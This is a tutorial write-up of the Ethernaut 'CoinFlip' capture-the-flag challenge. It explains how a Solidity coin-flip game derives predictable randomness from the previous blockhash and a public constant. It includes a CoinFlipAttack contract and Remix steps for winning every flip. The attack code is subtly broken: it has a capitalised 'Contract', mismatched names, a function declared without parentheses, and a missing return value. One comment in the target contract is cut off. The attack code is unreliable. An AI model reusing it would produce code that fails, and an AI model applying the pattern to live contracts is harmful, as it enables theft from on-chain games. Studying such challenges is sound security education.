# CoinFlip

Welcome to my Ethernaut solution series!
Today we will discuss the vulnerailities and the solution to 3rd problem called CoinFlip.
This smart contract is a coin flipping game where the player needs to get a winning streak by guessing the outcome of a coin. 

The goal of this challenge is:
1. Guess the correct outcome 10 times in a row

Let's take a look at the target contract:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract CoinFlip {

  using SafeMath for uint256;
  uint256 public consecutiveWins;   // consecutiveWins is the public uint variable holding the wins in a row for the player. 
                                    // We need to somehow increment this value to 10 to win this game.
  uint256 lastHash;   // lastHash is a variable which stores the value of a hash of the last block of our Rinkby blockchain.
                      // It is a state variable which is used to compare if the 
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;   // FACTOR is the variable holding a constant value
                      // which is used as a part of the process of creating entropy.

  constructor() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
```
## Code review

### Constructor
- The variable consecutiveWins needs to be initialised to Zero for every instance of the game.

### Functions
- We just have one function in this problem. The flip function takes in a parameter which is a bool. This is the guess provided by the player to play the game and predict the outcome as heads or tails mapped to True or False.
- The function also returns a bool which specifies that the guess by the player was correct or not.
The first part 
- lets look at line 18:
```solidity
uint256 blockValue = uint256(blockhash(block.number.sub(1)));
```
- Here block.number will give us the current block number, but as this block isnt mined yet, the contract cannot use it to create a hash. So we take the last mined block and compute a hash of that block number.
- Then we convert it to uint256 and store it in the variable blockValue. This variable is not needed in all instances, hence, it is not a state variable.
- Now the state variable lastHash is compared with blockValue to check if the last blockValue variable value is used again. The contract need to have a unique value everytime the function is called.

- on line 25, the value stored in the local variable blockValue is divided by the long number in the variable FACTOR. This action is done to increase the randomness. 
```solidity
uint256 coinFlip = blockValue.div(FACTOR);
```
- The value of coinFlip is compared to 1. If it matches then the variable side is True else False.
- Next it compares the the player's guess with the variable side. We need to match this variable 10 times in a row.

## Vulnerability

- The flawed way of using randomness is using globally accessible variables and functions to derive randomness. This means that anybody can see the values of these variables and by using them as seeds, recreate the random number. 
- In our case, the global variable used is blockhash(blockNumber). This gives the hash of the given block. In the code, blocknumber of the last mined block is used.
- The code also divides the hash with the constant FACTOR. Again this is a publicly accessible number which can be used while recreating the required random number.

## How to avoid the vulnerability

Avoid using variables such as timestamp, gasprice, difficulty, etc. for seeds while generating a random number.

## Solution
The hack for this problem is:
Write a new contract to recreate the flip value using the same globally accessible variables and call the public function flip from the CoinFlip contract. In the contract we will use the same variable value for FACTOR and access the globally available variables and replicate the coin's side to beat the game.

### Attack script
```solidity
Contract CoinFlipAttack {
	CoinFlip public victimContract;

    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

	constructor(address _victimContractAddr) public { 
		victimContract = coinFlip(_victimContractAddress);
	}
	
	function flip public returns (bool) {
		uint256 blockValue = uint256(blockhash(block.number - 1));
		uint256 coinFlip = uint256(blockValue/FACTOR);
		bool side = coinFlip == 1 ? true : false;

		victimContract.flip(side);
	}
}
```

### Code Review

- In the constructor we initialize the public variable victimContract with the instance of the object of the vulnerable contract we want to attack by passing the address of the instance of the Ethernaut contract. Note: While creating the object, we are not using the "new" keyword as we are not creating a new instance of the contract, but trying to access the already existing instance of the contract. 
- In the flip function we perform 2 steps: retrieve the publically accessible block number of the blockchain and divide the value by FACTOR.
- We check the value of the coinFlip variable and assign true or false value to our side variable.
- Then the flip function of the vulnerable contract is called using the instance earlier initialized and side variable is passed as an argument. 

## Attack execution

- Lets get the contract instance address of CoinFlip.sol from the Ethernaut console page first using the below command.
```solidity
await contract.address
```
- Compile and deploy both solidity codes, Coinflip.sol and CoinFlipAttack.sol on Remix IDE. while deploying CoinFlipAttack.sol, use the address retrieved in the above step.
- Once CoinFlipAttack is deployed, you will be able to see a flip function in the IDE. You will have to trigger that function. 
- This will generate the value for "side" variable same as that is created in the CoinFlip contract as the seed values used to create the random number.
- This side variable value is then sent to the flip function of CoinFlip function. This will execute the condition `if (side == _guess)` in the flip function and as we have the same guess as the side, we are always going to win!

## Conclusion
A smart contract should not use publically accessible numbers as seed to generate a random number. We could easily re-create the random number and provide a guess to the coin flop 100% of the time.